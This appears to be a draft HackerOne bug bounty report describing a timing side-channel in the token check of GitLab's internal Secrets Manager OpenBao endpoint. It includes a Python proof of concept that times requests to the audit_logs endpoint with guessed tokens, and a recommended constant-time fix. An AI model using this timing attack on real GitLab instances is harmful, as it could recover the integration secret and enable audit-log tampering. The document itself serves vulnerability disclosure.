# HackerOne Report: Timing Attack on OpenBao Secrets Manager Authentication Token

## Summary
A timing side-channel vulnerability exists in GitLab's Internal Secrets Manager API. The authentication token comparison for OpenBao integration uses Ruby's standard `==` operator instead of a constant-time comparison function, potentially allowing an attacker to brute-force the authentication token through timing analysis.

## Vulnerability Type
- **CWE-208**: Observable Timing Discrepancy
- **CVSS 3.1**: High (estimated 7.0-8.0)

## Affected Component
- **File**: `ee/lib/api/internal/secrets_manager.rb`
- **Line**: 31
- **Function**: `authenticate_request_from_openbao!`
- **Feature**: GitLab Secrets Manager (Enterprise Edition)

## Vulnerable Code

```ruby
# ee/lib/api/internal/secrets_manager.rb:30-34
def authenticate_request_from_openbao!
  return if openbao_authentication_token_secret == authentication_token_from_header

  render_api_error!('Unauthorized', :unauthorized)
end
```

Where:
- `openbao_authentication_token_secret` = Secret read from file on disk
- `authentication_token_from_header` = Value from `Gitlab-Openbao-Auth-Token` header

## Technical Details

### The Issue
The OpenBao (HashiCorp Vault fork) integration authenticates requests using a shared secret token. The comparison uses `==` which is vulnerable to timing attacks.

### Attack Vector
1. Attacker identifies GitLab instance with Secrets Manager enabled
2. Attacker sends requests to `/api/v4/internal/secrets_manager/audit_logs` with varying token guesses
3. By measuring response time differences, attacker can statistically determine correct characters
4. Once token is recovered, attacker can submit fake audit logs or potentially access other internal endpoints

### Severity Factors
- **Internal API**: But accessible if network path exists (e.g., from within same network segment as OpenBao)
- **Shared Secret Authentication**: Single static token protects the entire integration
- **Enterprise Feature**: Affects paid tier customers who rely on secrets management

### Endpoint
```
POST /api/v4/internal/secrets_manager/audit_logs
Header: Gitlab-Openbao-Auth-Token: <token>
```

## Proof of Concept

```python
import requests
import time
import statistics

def measure_timing(url, token_guess, iterations=100):
    times = []
    headers = {'Gitlab-Openbao-Auth-Token': token_guess, 'Content-Type': 'application/json'}
    for _ in range(iterations):
        start = time.perf_counter()
        requests.post(url, headers=headers, json={})
        times.append(time.perf_counter() - start)
    return statistics.mean(times), statistics.stdev(times)

url = "https://gitlab.internal/api/v4/internal/secrets_manager/audit_logs"

# Timing oracle exploitation
base = measure_timing(url, "A" * 64)
test1 = measure_timing(url, "X" + "A" * 63)  # Try 'X' as first char
test2 = measure_timing(url, "Y" + "A" * 63)  # Try 'Y' as first char
```

## Recommended Fix

Replace the vulnerable comparison with `ActiveSupport::SecurityUtils.secure_compare`:

```ruby
def authenticate_request_from_openbao!
  return if ActiveSupport::SecurityUtils.secure_compare(
    openbao_authentication_token_secret.to_s,
    authentication_token_from_header.to_s
  )

  render_api_error!('Unauthorized', :unauthorized)
end
```

## Impact

- **Authentication Bypass**: Recovery of OpenBao integration secret
- **Secrets Infrastructure**: Potential manipulation of audit logs or access to secrets management APIs
- **Compliance**: Tampered audit logs could mask unauthorized secrets access

## Suggested Severity
**High** - Affects enterprise secrets management infrastructure. While internal API requires network access, successful exploitation compromises critical security infrastructure.

## References
- [CWE-208: Observable Timing Discrepancy](https://cwe.mitre.org/data/definitions/208.html)
- [GitLab Secrets Management Documentation](https://docs.gitlab.com/ee/ci/secrets/)
- Related GitLab patterns using secure compare in other authentication flows

## Reporter
Submitted via GitLab Bug Bounty Program on HackerOne

---
**Status**: Ready for submission
**Target Program**: GitLab Bug Bounty
**Estimated Bounty**: $5,000 - $10,000 (High severity, secrets infrastructure)
